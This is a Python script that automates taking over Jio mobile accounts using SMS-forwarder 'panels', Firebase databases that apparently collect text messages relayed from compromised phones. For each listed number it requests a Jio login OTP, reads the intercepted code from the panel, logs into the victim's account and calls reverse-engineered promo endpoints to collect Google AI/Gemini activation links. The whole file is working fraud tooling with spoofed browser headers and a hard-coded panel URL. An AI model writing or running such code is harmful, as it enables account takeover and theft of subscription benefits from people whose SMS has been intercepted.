#!/usr/bin/env python3
"""
panel_farm.py — run the Jio/Gemini farm WITHOUT a phone, using a Firebase SMS panel
as the OTP source.

Why it works: every step of the Jio login is HTTP. The only reason a phone was needed
is that the OTP is delivered by SMS. An SMS-forwarder panel already receives those
SMS. So:

  device in panel  ->  its number N (AllData/<dev>.mobile)
  jio_send_otp(N)  ->  Jio SMSes the OTP to N
  device forwards  ->  OTP lands in the panel (GlobalSms, from *JIONET*)
  read it          ->  jio_validate_otp(otp)  ->  hunt_link()

No GrizzlySMS, no Moli CDP, no phone.

Usage:
  python3 panel_farm.py --panel https://gas3-6b801-default-rtdb.firebaseio.com --limit 5
  python3 panel_farm.py --panels panels.txt --limit 5 --min-age 0
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import time
from pathlib import Path

import requests

sys.path.insert(0, str(Path(__file__).resolve().parent))
from jiofarm.jio.auth import UA, jio_send_otp, jio_validate_otp   # noqa: E402
from jiofarm.jio.check import jio_check_subscriber                # noqa: E402
from jiofarm.jio.hunt import hunt_link, find_google_links         # noqa: E402

OTP_RE = re.compile(r"(?<!\d)(\d{4,8})(?!\d)")
OTP_SENDERS = ("jionet", "jio", "jiologin", "jio.com")


def panel_get(base: str, path: str, timeout: int = 12):
    r = requests.get(f"{base}{path}", headers={"User-Agent": UA}, timeout=timeout)
    if r.status_code != 200:
        return None
    try:
        return r.json()
    except Exception:
        return None


def device_map(base: str) -> dict[str, dict]:
    """{deviceHash: {num, siminfo, carrier, lastSeen}} from AllData."""
    d = panel_get(base, "/AllData.json", timeout=45)
    if not isinstance(d, dict):
        return {}
    out = {}
    for dev, v in d.items():
        if not isinstance(v, dict):
            continue
        num = re.sub(r"\D", "", str(v.get("mobile", "")))
        num = re.sub(r"^91(?=\d{10}$)", "", num)
        sim = str(v.get("simInfo", ""))
        if not re.fullmatch(r"[6-9]\d{9}", num or ""):
            m = re.search(r"(\+?91[6-9]\d{9})", sim)
            if m:
                num = re.sub(r"^91(?=\d{10}$)", "", re.sub(r"\D", "", m.group(1)))
        if not re.fullmatch(r"[6-9]\d{9}", num or ""):
            continue
        carrier = "jio" if "jio" in sim.lower() else (
            "airtel" if "airtel" in sim.lower() else
            ("vodafone" if "vodafone" in sim.lower() or " vi " in sim.lower() else "?"))
        out[dev] = {"num": num, "siminfo": sim, "carrier": carrier,
                    "lastSeen": v.get("lastSeen", 0)}
    return out


def poll_otp(base: str, dev: str, since_ms: int, timeout: int = 100, interval: int = 4) -> str | None:
    """Watch GlobalSms for a NEW OTP addressed to *dev* (device_id match)."""
    deadline = time.time() + timeout
    seen = set()
    while time.time() < deadline:
        g = panel_get(base, "/GlobalSms.json?shallow=true", timeout=15)
        if isinstance(g, dict):
            keys = sorted((k for k in g if str(k).isdigit()), key=int, reverse=True)[:40]
            for k in keys:
                if k in seen:
                    continue
                seen.add(k)
                if int(k) < since_ms:
                    continue
                entry = panel_get(base, f"/GlobalSms/{k}.json", timeout=12)
                if not isinstance(entry, dict):
                    continue
                if entry.get("device_id") != dev:
                    continue
                frm = str(entry.get("from", "")).lower()
                msg = str(entry.get("msg", ""))
                if not any(s in frm for s in OTP_SENDERS):
                    continue
                m = OTP_RE.search(msg)
                if m and "otp" in msg.lower():
                    return m.group(1)
        time.sleep(interval)
    return None


def fresh_devices(base: str, jio_only: bool = True) -> list[tuple[str, dict]]:
    dm = device_map(base)
    items = list(dm.items())
    if jio_only:
        items = [(d, i) for d, i in items if i["carrier"] == "jio"]
    items.sort(key=lambda di: -di[1].get("lastSeen", 0))
    return items


def hunt_link_v6(s: requests.Session) -> dict:
    """Full post-login promo flow, reverse-engineered from the googleai page JS.

    1. GET  /api/jio-authenticate-service/authenticate/authJsonData?t=<ts>   (bridges session)
    2. GET  /api/jio-ott-service/ott/subscription/activate/Z0241  (header otype: Z0241)
    3. GET  /api/jio-ott-service/ott/subscription/google-ai      -> redirectionURL
    """
    out = {"activate": None, "link": None, "msg": None}
    base = "https://www.jio.com"
    try:
        s.get(f"{base}/api/jio-authenticate-service/authenticate/authJsonData?t={int(time.time()*1000)}",
              timeout=15)
    except Exception:
        pass
    try:
        act = s.get(f"{base}/api/jio-ott-service/ott/subscription/activate/Z0241",
                    headers={"otype": "Z0241"}, timeout=15)
        out["activate"] = act.text[:200]
    except Exception:
        pass
    try:
        ga = s.get(f"{base}/api/jio-ott-service/ott/subscription/google-ai", timeout=15)
        if ga.status_code == 200:
            d = ga.json()
            out["link"] = d.get("redirectionURL")
            out["msg"] = d.get("errorMessage")
    except Exception:
        pass
    return out


def farm_one(base: str, dev: str, info: dict) -> dict:
    phone = info["num"]
    rec = {"panel": base, "dev": dev, "phone": phone, "status": "", "link": None}
    s = requests.Session()
    s.headers.update({
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.jio.com",
        "Referer": "https://www.jio.com/selfcare/googleai/",
        "sec-ch-ua": '"Chromium";v="126"',
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    })
    # 1) send OTP
    since = int(time.time() * 1000)
    try:
        r = s.post("https://www.jio.com/api/jio-login-service/login/sendOtp",
                   json={"mobileNumber": phone, "loginFlowType": "MOBILE", "alternateNumber": ""},
                   timeout=20)
    except Exception as e:
        rec["status"] = f"sendOtp_err"
        return rec
    if r.status_code != 200:
        rec["status"] = f"sendOtp_{r.status_code}"
        return rec
    # 2) read OTP from the panel
    otp = poll_otp(base, dev, since, timeout=120)
    if not otp:
        rec["status"] = "otp_timeout"
        return rec
    rec["otp"] = otp
    # 3) validate
    v = s.post("https://www.jio.com/api/jio-login-service/login/validateOtp",
               json={"otp": otp}, timeout=15)
    if v.status_code != 200:
        rec["status"] = f"validate_{v.status_code}"
        return rec
    # 4) promo flow
    h = hunt_link_v6(s)
    rec["activate"] = h.get("activate")
    if h.get("link"):
        rec["link"] = h["link"]
        rec["status"] = "LINK"
    else:
        rec["status"] = f"no_link({h.get('msg')})"
    return rec


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--panel", help="single panel base URL")
    ap.add_argument("--panels", help="panels.txt file")
    ap.add_argument("--limit", type=int, default=5)
    ap.add_argument("--all-carriers", action="store_true")
    ap.add_argument("--out", default="gemini_activation_links.txt")
    args = ap.parse_args()

    bases = []
    if args.panel:
        bases = [args.panel.rstrip("/")]
    elif args.panels:
        bases = [l.split("|")[0].strip().rstrip("/")
                 for l in Path(args.panels).read_text().splitlines() if l.strip()]
    if not bases:
        print("need --panel or --panels", file=sys.stderr)
        return 1

    links = []
    for base in bases:
        items = fresh_devices(base, jio_only=not args.all_carriers)
        now = time.time() * 1000
        print(f"[{base}] {len(items)} fresh Jio devices", file=sys.stderr)
        for dev, info in items[:args.limit]:
            age = (now - info.get("lastSeen", 0)) / 60000
            print(f"  -> {info['num']} (dev {dev}, seen {age:.0f}m ago)", file=sys.stderr)
            rec = farm_one(base, dev, info)
            print(f"     {rec['status']}" + (f"  {rec.get('link')}" if rec.get("link") else ""),
                  file=sys.stderr)
            if rec.get("link"):
                links.append(rec["link"])
            if len(links) >= args.limit:
                break
        if len(links) >= args.limit:
            break

    if links:
        Path(args.out).write_text("\n".join(links) + "\n")
        print(f"\n=== {len(links)} LINKS -> {args.out} ===", file=sys.stderr)
        for l in links:
            print(l)
    else:
        print("\nno links produced", file=sys.stderr)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
